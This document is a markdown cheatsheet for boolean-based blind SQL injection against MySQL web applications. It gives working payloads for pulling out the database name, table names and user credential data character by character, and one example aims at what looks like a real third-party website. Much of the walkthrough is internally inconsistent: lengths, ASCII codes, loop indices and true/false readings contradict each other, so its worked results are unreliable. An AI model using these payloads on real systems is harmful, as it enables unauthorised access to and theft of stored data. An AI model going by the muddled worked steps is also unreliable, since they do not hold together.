# MySQL Boolean Based Blind SQL Injection Cheatsheet

## Identifying the vulnerability

Normally in Blind SQLi, you can't really see the output of queries you enter. In this case, the only way to verify about the vulnerability, is by looking if the website loads successfuly or not/partially.

Use the following queries to identify the website behaviour:  

```http://domain.com/index.php?id=1' AND 4570=4570 AND 'ZeoB'='ZeoB```  
Page fully loads successfuly.  

```http://www.nttbworld.com/tour-details.php?id=65' AND 4570=4570 AND 'ZeoB'='ZeoBFalse```  
Page will partially load or it will not even load.  

## Retrieving database

**Retrieving the length of database name**

The given query will verify if database has 14 characters.  
```http://domain.com/index.php?id=1' AND (length(database())) = 15 --+```  
If website partially loads or doesn't load, it means that database is not 10 characters long.

The given query will verify if database has 9 characters.  
```http://domain.com/index.php?id=1' AND (length(database())) = 11 --+```  
Page loads successfully. Database name is 11 characters long.

**Retrieving the database name**

This method is slow, because we have to hit-or-miss for every character of the database. Let's take a look below. The below table, will help us convert ascii to string.  

![ascii_table](https://www.asciitable.com/asciifull.gif)

The given query will define is the first character of database name is 111 (o)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),1,1))) > 110 --+```  
Website doesn't load fully, so our condition is incorrect, let's try another ascii.  

The given query will define is the first character of database name is 110 (n)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),1,1))) > 109 --+```  
Website loads fully, this means the first character of database is **n**.

Continue enumerate the second character of database name.  

The given query will define is the first character of database name is 98 (h)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),2,1))) > 97 --+```  
Website doesn't load fully, so our condition is incorrect, let's try another ascii.  


The given query will define is the first character of database name is 116 (t)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),2,1))) > 115 --+```  
Website loads fully, this means the second character of database is **t**.

Continue doing the same process over and over until you find all 11 characters.  

1st character: 110 -> **n**  
2nd character: 116 -> **t**  
3rd character: 116 -> **t**  
4th character: 104 -> **h**  
5th character: 119 -> **w**  
6th character: 102 -> **f**  
7th character: 105 -> **i**  
8th character: 57 -> **9**  
9th character: 95 -> _  
10th character: 100 -> **d**  
11th character: 98 -> **b**  

All 11 charachters combined together will be the database name: **ntthwfi9_db**

**Retrieving length of table name**

Given query will test the condition whether the length of string for the first table is equal than 4 or not.  
```' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 4 --+```

The website didn't load properly, so let's try if the length is 5 characters:  
```' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+```  
The website loads fully, so the length of the first table name is 5.  

**NOTE:** You can enumerate the others table too, by changing the number value in this part of payload: (limit **0**,1). Simply replace it with another number. For example, let's see if 4th column has 6 characters:  
```' AND (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) = 6 --+```  

**Retrieving name of table name**  

On this case, I will enumerate the the first column.
Let's find the first character of table:  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) > 108 --+```  
Website doesn't load properly, false response.  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) > 114 --+```  
Website doesn't load properly, false response.  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) > 116 --+```  
Website fully loads, it means the first character is ascii 117 (u).  


Let's find the last character of table (5th character):  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1) ,1,1))) > 96 --+```  
Website doesn't load properly, false response.  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1) ,1,1))) > 105 --+```  
Website doesn't load properly, false response.  

```' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1) ,1,1))) > 114 --+```  
Website fully loads, it means the first character is ascii 115 (s).  

Keep doing the same process for the other characters, until you find all the characters.  

1st character: 110 -> **u**  
2nd character: 115 -> **s**  
3rd character: 101 -> **e**  
4th character: 114 -> **r**  
5th character: 115 -> **s**  

All 5 charachters combined together will be the first table name: **users**

**Retrieve length of column name**  

Using the same method as before, enumerate the length of column name.

Given below query will test for string length is equal to 6 or not:  
```' AND (length((select username from users limit 0,1))) = 6 --+```  
Website doesn't load properly, column is not 6 characters long.  

Given below query will test for string length is equal to 4 or not:  
```' AND (length((select username from users limit 0,1))) = 4 --+```  
Website fully loads, column is 6 characters long.  

Using the same method, you can also enumerate other columns.

Enumerate the length of second column if it is 6 or not:  
```' AND (length((select username from users limit 1,1))) = 6 --+```  

Enumerate the length of third column if it is 5 or not:  
```' AND (length((select username from users limit 2,1))) = 5 --+```  

And so on...

**Retrieve column name**

Since we know the length of column name is 4, let's find out the characters one by one.

Given below query will test if the first character of the first column name is ascii 101 (e):  
```' AND (ascii(substr((select username from users limit 0,1) ,1,1))) > 100 --+```  
Website doesn't load properly, first char is not **e**.  

Given below query will test if the first character of the first column name is ascii 112 (p):  
``' AND (ascii(substr((select username from users limit 0,1) ,1,1))) > 111 --+``  
Website doesn't load properly, first char is **p**.  

Given below query will test if the second character of the first column name is ascii 97 (a):  
``' AND (ascii(substr((select username from users limit 1,1) ,1,1))) > 96 --+``  
Website doesn't load properly, second char is **a**.  

Given below query will test if the third character of the first column name is ascii 115 (s):  
``' AND (ascii(substr((select username from users limit 2,1) ,1,1))) > 114 --+``  
Website doesn't load properly, third char is **s**.  

Given below query will test if the fourth character of the first column name is ascii 115 (s):  
``' AND (ascii(substr((select username from users limit 3,1) ,1,1))) > 114 --+``  
Website doesn't load properly, fourth char is **s**.  

1st character: 110 -> **p**  
2nd character: 97 -> **a**  
3rd character: 115 -> **s**  
4th character: 115 -> **s**  

All 4 charachters combined together will be the column table name: **pass**

